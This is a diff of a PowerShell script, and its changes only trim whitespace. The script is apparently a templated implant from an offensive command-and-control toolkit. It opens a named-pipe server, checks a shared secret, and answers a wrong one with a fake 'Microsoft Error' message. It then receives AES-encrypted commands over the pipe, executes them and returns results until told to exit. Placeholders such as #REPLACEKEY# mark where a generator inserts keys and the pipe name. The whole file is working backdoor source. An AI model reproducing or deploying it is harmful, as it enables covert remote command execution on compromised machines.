@@ -1,4 +1,4 @@
-function Create-AesManagedObject 
+function Create-AesManagedObject
 {
     param
     (
@@ -12,24 +12,24 @@ function Create-AesManagedObject
     $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $aesManaged.BlockSize = 128
     $aesManaged.KeySize = 256
-    if ($IV) 
+    if ($IV)
     {
-        if ($IV.getType().Name -eq 'String') 
+        if ($IV.getType().Name -eq 'String')
         {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
-        else 
+        else
         {$aesManaged.IV = $IV}
     }
-    if ($key) 
+    if ($key)
     {
-        if ($key.getType().Name -eq 'String') 
+        if ($key.getType().Name -eq 'String')
         {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
-        else 
+        else
         {$aesManaged.Key = $key}
     }
     $aesManaged
 }
 
-function Encrypt-String 
+function Encrypt-String
 {
     param
     (
@@ -46,7 +46,7 @@ function Encrypt-String
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
     [System.Convert]::ToBase64String($fullData)
 }
-function Decrypt-String 
+function Decrypt-String
 {
     param
     (
@@ -62,7 +62,7 @@ function Decrypt-String
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
- 
+
 function invoke-pserv {
 param ($secret, $key, $pname)
 
@@ -76,29 +76,29 @@ try {
     'Waiting for client connection'
     $pipe.WaitForConnection()
     'Connection established'
- 
+
     $pipeReader = new-object System.IO.StreamReader($pipe)
     $pipeWriter = new-object System.IO.StreamWriter($pipe)
     $pipeWriter.AutoFlush = $true
- 
+
     $PPass = $pipeReader.ReadLine()
-    
- 
+
+
     while (1)
-    {        
+    {
         if ($PPass -ne $secret) {
             $pipeWriter.WriteLine('Microsoft Error: 151337')
         }
-        
+
         else {
-            
+
             while (1) {
                 $encCommand = Encrypt-String -unencryptedString 'COMMAND' -Key $key
                 $pipeWriter.WriteLine($encCommand)
-                
+
                 $command = $pipeReader.ReadLine()
                 $decCommand = Decrypt-String -key $key -encryptedStringWithIV $command
-                           
+
                 if ($deccommand) {
                     try {
                         $error.clear()
@@ -126,7 +126,7 @@ try {
                     break
                 }
 
-            }                       
+            }
         }
         $encGo = Encrypt-String -unencryptedString 'GOAGAIN' -Key $key
         $pipeWriter.WriteLine($encGo)
@@ -136,7 +136,7 @@ try {
         $decCommand = Decrypt-String -key $key -encryptedStringWithIV $command
         if ($decCommand -eq 'EXIT') { break }
     }
- 
+
     Start-Sleep -Seconds 2
 }
 finally {
@@ -144,4 +144,3 @@ finally {
 }
 }
 invoke-pserv -secret #REPLACEPBINDSECRET# -key #REPLACEKEY# -pname #REPLACEPBINDPIPENAME#
-
